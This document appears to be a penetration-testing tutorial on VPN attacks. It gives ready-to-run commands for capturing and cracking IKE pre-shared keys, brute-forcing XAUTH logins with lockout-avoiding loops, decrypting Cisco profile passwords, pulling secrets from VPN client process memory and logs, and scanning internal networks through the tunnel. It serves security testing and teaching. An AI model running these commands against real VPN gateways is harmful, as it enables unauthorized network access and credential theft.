# VPN Credential and Tunnel Attack Guide

## Introduction

VPN credentials and tunnels are critical attack surfaces in enterprise networks. Once a VPN gateway has been identified and enumerated, the next phase involves testing credential strength, analyzing tunnel security, and assessing the overall robustness of the VPN implementation. This guide covers PSK cracking, certificate analysis, tunnel hijacking concepts, and credential brute force techniques for authorized penetration testing.

VPN credentials are particularly valuable to attackers because they often provide direct access to internal networks, bypassing perimeter defenses. A compromised VPN account can be used for persistent access, lateral movement, and data exfiltration. Organizations that rely solely on username/password authentication for VPN access are especially vulnerable to credential-based attacks.

**Objectives**: Crack captured PSK hashes, analyze VPN certificates, test tunnel security, and assess split tunneling risks.

## PSK Cracking

### Capturing PSK Hash

Aggressive Mode IKE negotiations transmit the PSK hash in cleartext, making it vulnerable to capture and offline cracking. The quality of the PSK directly determines how resistant it will be to dictionary attacks.

```bash
# Capture PSK via aggressive mode with specific transform
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1 > psk_hash.txt

# Extract the hash value from capture
grep -i "hash\|SA\|key" psk_hash.txt

# Try multiple transforms if the first fails
ike-scan --aggressive --trans='5,1,2,2' --trans='5,2,2,2' --trans='5,1,65001,2' -M 192.168.1.1 > psk_all.txt
```

### ikeforce Dictionary Attack

ikeforce performs online dictionary attacks against IKE VPN gateways using aggressive mode. This is useful when you cannot capture a hash but know the transform set and identity.

```bash
# Basic dictionary attack with common wordlist
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -w /usr/share/wordlists/rockyou.txt

# With custom ID type (FQDN, IP, or user FQDN)
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -u ID_FQDN -w wordlist.txt

# Numeric PIN brute force for group IDs
for i in $(seq 0000 9999); do
  ike-scan --aggressive --trans='5,1,2,2' --id="$i" 192.168.1.1 2>/dev/null
done
```

### ikecrack Offline Cracking

ikecrack performs offline cracking of captured PSK hashes, which is faster and stealthier than online attacks since it does not generate traffic to the target.

```bash
# Crack captured PSK hash offline with dictionary
python3 ikecrack.py -h captured_hash.txt -d dictionary.txt

# With custom charset for targeted brute force
python3 ikecrack.py -h captured_hash.txt -c charset.txt
```

## Certificate Analysis

### Certificate Retrieval and Inspection

VPN certificates often contain valuable intelligence about the organization, including internal hostnames, department names, and email addresses. Certificate weaknesses such as self-signed certs or expired certificates can indicate security maturity gaps.

```bash
# Retrieve VPN certificate and inspect all fields
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -text

# Check certificate validity (current time)
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -checkend 0 -noout

# Extract and save certificate for offline analysis
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -out vpn_cert.pem

# Verify certificate chain against system CA store
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt vpn_cert.pem
```

### Self-Signed Certificate Testing

```bash
# Generate test certificate for authentication testing
openssl req -x509 -newkey rsa:2048 -nodes -keyout test.key -out test.crt -days 365 -subj "/CN=vpn-test"

# Create PKCS12 bundle for VPN client import
openssl pkcs12 -export -out test.p12 -inkey test.key -in test.crt -name "VPN Test"

# Check for certificate pinning by testing if server accepts any valid cert
# If the server accepts any CA-signed certificate, pinning is not enforced
```

## Tunnel Security Testing

### Traffic Capture and Analysis

Analyzing VPN tunnel traffic can reveal configuration weaknesses such as unencrypted payloads, weak cipher negotiations, or information leakage through IKE metadata.

```bash
# Capture IKE and ESP traffic for analysis
tcpdump -i any -w vpn_full.pcap 'udp port 500 or udp port 4500 or proto 50'

# Analyze IKE negotiation details
tshark -r vpn_full.pcap -Y "isakmp" -T fields -e ip.src -e ip.dst -e isakmp.type -e isakmp.dh_group

# Check for plaintext leaking into ESP (indicates encryption bypass)
tshark -r vpn_full.pcap -Y "esp" -x | head -50
```

### Split Tunneling Detection

Split tunneling allows VPN traffic to route only specific networks through the tunnel while other traffic goes directly to the Internet. This configuration can leak sensitive DNS queries and expose the client's real IP address.

```bash
# Check routing table for VPN-specific entries
ip route show

# Identify VPN-specific routes
ip route show table all | grep -i "tun\|ppp"

# Test for Internet bypass (if traceroute goes through physical interface, split tunnel is active)
traceroute -n 8.8.8.8 2>&1 | head -5

# DNS leak test comparing VPN vs real IP
dig +short myip.opendns.com @resolver1.opendns.com
ip addr show tun0 | grep inet
```

### Tunnel Hijacking Concepts

MITM on VPN connections requires positioning between client and VPN gateway, which typically involves ARP spoofing on the local network segment.

```bash
# Detect ARP spoofing attempts (defensive monitoring)
arpwatch -i eth0

# Monitor for rogue VPN gateways on the network
ike-scan -M 192.168.1.0/24 | grep -i "VID\|encryption"
```

## XAUTH Credential Testing

### vpnc Connection Testing

```bash
# Test XAUTH credentials with vpnc
vpnc --gateway 192.168.1.1 --id groupname --secret grouppsk --username testuser

# Debug mode for detailed negotiation output
vpnc --debug 3 --gateway 192.168.1.1 --id groupname --secret grouppsk --username testuser 2>&1 | tee vpnc_debug.log

# Disconnect active session
vpnc-disconnect
```

### Automated Credential Testing

```bash
# Hydra against IKE XAUTH service
hydra -l admin -P passwords.txt 192.168.1.1 ike

# Custom bash brute force with timeout protection
while IFS= read -r user; do
  while IFS= read -r pass; do
    timeout 5 vpnc --gateway 192.168.1.1 --id test --secret psk --username "$user" --password "$pass" 2>/dev/null && echo "SUCCESS: $user:$pass"
    vpnc-disconnect 2>/dev/null
  done < passwords.txt
done < usernames.txt
```

## Hands-on Exercises

### Exercise 1: PSK Hash Capture and Crack

Capture an aggressive mode PSK hash and attempt dictionary cracking.

```bash
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1 > hash.txt
# Analyze the captured hash and attempt offline crack
```

### Exercise 2: Certificate Chain Analysis

Retrieve and analyze the full certificate chain of a VPN gateway, documenting any weaknesses found.

```bash
openssl s_client -showcerts -connect 192.168.1.1:443 </dev/null 2>/dev/null | openssl x509 -noout -text
```

### Exercise 3: Split Tunneling Verification

Connect to a test VPN and verify if traffic leaks outside the tunnel by capturing on the physical interface.

```bash
tcpdump -i eth0 -c 100 'not arp and not port 500 and not port 4500 and not proto 50'
# Generate traffic and check for leaks
```

### Exercise 4: vpnc Connection Profile Analysis

Analyze a provided .pcf VPN profile for security issues such as weak encryption or embedded credentials.

```bash
cat profile.pcf
grep -i "enc\|hash\|group" profile.pcf
```

## Advanced Tunnel Exploitation

### Tunnel Traffic Analysis

Understanding VPN tunnel traffic patterns is essential for identifying misconfigurations and potential exploitation opportunities. Encapsulating Security Payload (ESP) packets carry the encrypted data, but even encrypted traffic reveals information through metadata analysis.

```bash
# Capture and analyze ESP packet size patterns (reveals data volume and timing)
tcpdump -i any -w esp_analysis.pcap 'proto 50' -c 1000
tshark -r esp_analysis.pcap -Y "esp" -T fields \
  -e ip.src -e ip.dst -e ip.len -e esp.spi -e frame.time_relative 2>/dev/null | \
  awk '{spi[$4]++; size[$4]+=$5} END {for (s in spi) print s, spi[s], size[s]}' | sort -k2 -rn

# Detect rekey patterns (SA lifetime analysis)
tshark -r vpn_full.pcap -Y "isakmp.type == 5 or isakmp.type == 34" \
  -T fields -e frame.time -e isakmp.type 2>/dev/null

# Identify DPD (Dead Peer Detection) timing for session hijacking window
tshark -r vpn_full.pcap -Y "isakmp.type == 36128 or isakmp.notification_type == 36129" \
  -T fields -e frame.time -e ip.src -e ip.dst 2>/dev/null
```

### VPN Route Manipulation

Once authenticated to a VPN, testing the routing and access controls is critical. Many VPN deployments over-provision network access, allowing authenticated users to reach segments they should not be able to access.

```bash
# Enumerate all accessible routes through the VPN tunnel
ip route show table all | grep -E "tun|ppp|ppp0"

# Scan for accessible internal networks through VPN
# Method 1: Sequential host discovery
for subnet in 10.0.0.0/24 10.0.1.0/24 10.0.2.0/24 172.16.0.0/24 192.168.0.0/24; do
  echo "Scanning $subnet through VPN..."
  nmap -sn $subnet --interface tun0 -oG - | grep "Up"
done

# Method 2: Identify VPN-assigned DNS search domains for target enumeration
cat /etc/resolv.conf | grep -i search
# Use discovered domains for targeted enumeration
dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') +short internal.example.com

# Test for ACL bypass via source routing
ip route add 10.10.10.0/24 via $(ip route | grep default | awk '{print $3}') dev tun0
nmap -sT -Pn 10.10.10.0/24 --top-ports 20 --interface tun0

# Check for access to management interfaces through VPN
nmap -sT -Pn --interface tun0 10.0.0.0/24 -p 22,23,80,443,8080,8443,3389,3306,5432
```

### DNS and Traffic Interception Through VPN

VPN tunnels often push DNS configuration to the client. Misconfigured DNS push settings can be exploited for internal network reconnaissance and traffic redirection.

```bash
# Analyze DNS configuration pushed by VPN
cat /etc/resolv.conf
# Check for internal domain names revealing organizational structure

# Test DNS resolution through VPN vs direct
dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') internal.corp.local AXFR
# Attempt zone transfer for full internal network mapping

# Check for DNS cache snooping to identify visited internal resources
dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') +dnssec internal-api.corp.local

# Test for VPN DNS server recursion (can be used for DDoS amplification)
dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') google.com +dnssec
```

## VPN Client Security Assessment

VPN client software often introduces vulnerabilities that are overlooked during infrastructure-focused assessments. Client-side vulnerabilities can be exploited to harvest credentials, elevate privileges, or establish persistent access.

### Configuration File Analysis

```bash
# Analyze OpenVPN configuration for security issues
cat client.ovpn | grep -iE "auth|cipher|tls|remote|proto|comp-lzo"
# Flags: comp-lzo (compression enables CRIME/VORACLE attacks)
# Flags: cipher AES-128-CBC (weak, should be AES-256-GCM)
# Flags: auth SHA1 (weak, should be SHA256+)

# Analyze Cisco .pcf profile files
cat vpn_profile.pcf
# Look for: enc_GroupPwd (encrypted but crackable), Host, AuthType
# Decrypt Cisco group password from .pcf
cisco-decrypt <encrypted_password_from_pcf>

# Check WireGuard configuration for security issues
cat /etc/wireguard/wg0.conf
# Look for: AllowedIPs = 0.0.0.0/0 (full tunnel, no split)
# Look for: DNS = (DNS configuration pushed to client)
# Check for hardcoded private keys
grep -i "PrivateKey" /etc/wireguard/*.conf
```

### Client Process Security

```bash
# Check VPN client process for memory-resident credentials
# (requires root on the client machine)
pid=$(pgrep -f "openvpn\|vpnc\|strongswan\|wg-quick")
if [ -n "$pid" ]; then
  # Memory map analysis
  cat /proc/$pid/maps | grep -E "heap|stack"
  # Environment variable extraction
  cat /proc/$pid/environ | tr '\0' '\n' | grep -iE "pass|key|secret"
fi

# Check for credential caching in VPN client log files
find /var/log /tmp -name "*vpn*" -o -name "*ipsec*" -o -name "*openvpn*" 2>/dev/null | \
  xargs grep -li "password\|secret\|psk\|private.key" 2>/dev/null
```

## Advanced Credential Attack Techniques

### Hybrid PSK Cracking

When standard dictionary attacks fail against PSK hashes, hybrid attacks combining dictionary words with numeric suffixes, l33tspeak substitutions, and common organizational patterns can be more effective.

```bash
# Generate targeted wordlist based on organization information
# Combine company name with common patterns
company="AcmeCorp"
for suffix in "" "123" "1234" "2024" "2025" "vpn" "VPN" "secure" "!@#" "admin"; do
  echo "${company}${suffix}"
  echo "${company,,}${suffix}"  # lowercase
  echo "${company^^}${suffix}"  # uppercase
done > targeted_wordlist.txt

# Use hashcat hybrid mode (mode 5300 = IKE-PSK)
hashcat -m 5300 -a 6 psk_hash.txt base_words.txt ?d?d?d?d
# -a 6 = hybrid: word + mask (append 4 digits)

# Rule-based attack with common transformations
hashcat -m 5300 -r /usr/share/hashcat/rules/best64.rule psk_hash.txt /usr/share/wordlists/rockyou.txt
```

### XAUTH Credential Testing at Scale

For engagements targeting organizations with many VPN users, automated credential testing against XAUTH can reveal weak passwords across the user base. This should only be performed with explicit authorization and careful rate limiting to avoid account lockouts.

```bash
# Determine lockout threshold first (test with valid account if available)
for i in $(seq 1 10); do
  response=$(timeout 5 vpnc --gateway 192.168.1.1 --id test --secret psk \
    --username testuser --password "wrong${i}" 2>&1)
  echo "Attempt $i: $response"
done

# Targeted credential testing with lockout awareness
# Space attempts to avoid triggering lockout policies
while IFS= read -r user; do
  while IFS= read -r pass; do
    timeout 10 vpnc --gateway 192.168.1.1 --id group --secret psk \
      --username "$user" --password "$pass" 2>/dev/null
    if [ $? -eq 0 ]; then
      echo "SUCCESS: $user:$pass" | tee -a vpn_creds.txt
      vpnc-disconnect 2>/dev/null
    fi
    sleep 60  # Rate limit to avoid lockout
  done < passwords.txt
done < usernames.txt
```

## References

- ikeforce — https://github.com/SpiderLabs/ikeforce
- ikecrack — https://github.com/royhills/ikecrack
- vpnc documentation — https://github.com/streambinder/vpnc
- RFC 2409 — The Internet Key Exchange (IKE)
- VPN security testing — PTES Technical Guidelines
- RFC 7296 — IKEv2 protocol specification
- hashcat IKE-PSK modes — https://hashcat.net/wiki/doku.php?id=example_hashes
- VPN Traffic Analysis — SANS Institute Reading Room
